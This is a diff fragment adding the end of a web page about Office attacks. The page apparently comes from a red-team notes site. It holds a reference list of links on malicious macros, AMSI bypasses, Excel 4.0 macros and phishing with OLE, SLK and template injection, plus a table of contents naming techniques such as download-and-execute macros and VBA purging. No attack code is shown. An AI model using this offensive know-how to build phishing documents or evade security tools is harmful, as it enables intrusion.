+  <a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">Office VBA AMSI Parting the veil on malicious macros - Microsoft</a></li>
+<li>
+  <a href="https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/">Bypassing AMSI fro VBA - Outflank</a></li>
+<li>
+  <a href="https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/">Evil Clippy MS Office Maldoc Assistant - Outflank</a></li>
+<li>
+  <a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">Old schoold evil execl 4.0 macros XLM - Outflank</a></li>
+<li>
+  <a href="https://bytecod3r.io/excel-4-macro-generator-x86-x64/">Excel 4 Macro Generator x86/x64 - bytecod3r</a></li>
+<li>
+  <a href="https://github.com/Pepitoh/VBad">VBad - Pepitoh</a></li>
+<li>
+  <a href="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf">Excel 4.0 Macro Function Reference PDF</a></li>
+<li>
+  <a href="https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/">Excel 4.0 Macros so hot right now - SneekyMonkey</a></li>
+<li>
+  <a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/">Macros and more with sharpshooter v2.0 - mdsec</a></li>
+<li>
+  <a href="https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/">Further evasion in the forgotten corners of ms xls - malware.pizza</a></li>
+<li>
+  <a href="https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9">Excel 4.0 macro old but new - fsx30</a></li>
+<li>
+  <a href="https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/">XLS 4.0 macros and covenant - d-sec</a></li>
+<li>
+  <a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros">Inject macro from a remote dotm template - ired.team</a></li>
+<li>
+  <a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-&#43;-lnk">Phishinh with OLE - ired.team</a></li>
+<li>
+  <a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel">Phishing SLK - ired.team</a>bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li>
+<li>
+  <a href="https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/">PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</a></li>
+<li>
+  <a href="https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/">AMSI in the heap - rmdavy</a></li>
+<li>
+  <a href="https://github.com/rmdavy/WordAmsiBypass">WordAMSIBypass - rmdavy</a></li>
+<li>
+  <a href="https://blog.f-secure.com/dechaining-macros-and-evading-edr/">Dechaining macros and evading EDR - Noora Hyvärinen</a></li>
+<li>
+  <a href="http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html">Executing macros from docx with remote - RedXORBlueJuly 18, 2018</a></li>
+<li>
+  <a href="https://adepts.of0x.cc/alternatives-copy-shellcode/">One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</a></li>
+<li>
+  <a href="http://www.greyhathacker.net/?p=948">Running macros via ActiveX controls - greyhathacker - September 29, 2016</a></li>
+<li>
+  <a href="https://www.goggleheadedhacker.com/blog/post/23">Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/office_attacks.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#office---attacks">Office - Attacks</a>
+      <ul>
+        <li><a href="#xlsm---hot-manchego">XLSM - Hot Manchego</a></li>
+        <li><a href="#xlm---macrome">XLM - Macrome</a></li>
+        <li><a href="#xlm-excel-40---sharpshooter">XLM Excel 4.0 - SharpShooter</a></li>
+        <li><a href="#xlm-excel-40---excelntdonut">XLM Excel 4.0 - EXCELntDonut</a></li>
+        <li><a href="#xlm-excel-40---exec">XLM Excel 4.0 - EXEC</a></li>
+        <li><a href="#docm---metasploit">DOCM - Metasploit</a></li>
+        <li><a href="#docm---download-and-execute">DOCM - Download and Execute</a></li>
+        <li><a href="#docm---macro-creator">DOCM - Macro Creator</a></li>
+        <li><a href="#docm---c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</a></li>
+        <li><a href="#docm---vba-wscript">DOCM - VBA Wscript</a></li>
+        <li><a href="#docm---vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</a></li>
+        <li><a href="#docm---vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li>
+        <li><a href="#docm---wmi-com-functions">DOCM - WMI COM functions</a></li>
+        <li><a href="#docmxlm---macro-pack---macro-and-dde">DOCM/XLM - Macro Pack - Macro and DDE</a></li>
+        <li><a href="#docm---badassmacros">DOCM - BadAssMacros</a></li>
+        <li><a href="#docm---cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</a></li>
+        <li><a href="#docm---mmg-with-custom-dl--exec">DOCM - MMG with Custom DL + Exec</a></li>
+        <li><a href="#docm---activex-based-inkpicture-control-painted-event-autorun-macro">DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</a></li>
+        <li><a href="#vba-obfuscation">VBA Obfuscation</a></li>
+        <li><a href="#vba-purging">VBA Purging</a>
+          <ul>
+            <li><a href="#officepurge">OfficePurge</a></li>
+            <li><a href="#evilclippy">EvilClippy</a></li>
+          </ul>
+        </li>
+        <li><a href="#vba---offensive-security-template">VBA - Offensive Security Template</a></li>
+        <li><a href="#vba---amsi">VBA - AMSI</a></li>
+        <li><a href="#docx---template-injection">DOCX - Template Injection</a>
+          <ul>
+            <li><a href="#remote-template">Remote Template</a></li>
+            <li><a href="#template-injections-tools">Template Injections Tools</a></li>
+          </ul>
+        </li>
+        <li><a href="#docx---dde">DOCX - DDE</a></li>
+        <li><a href="#slk---excel">SLK - Excel</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
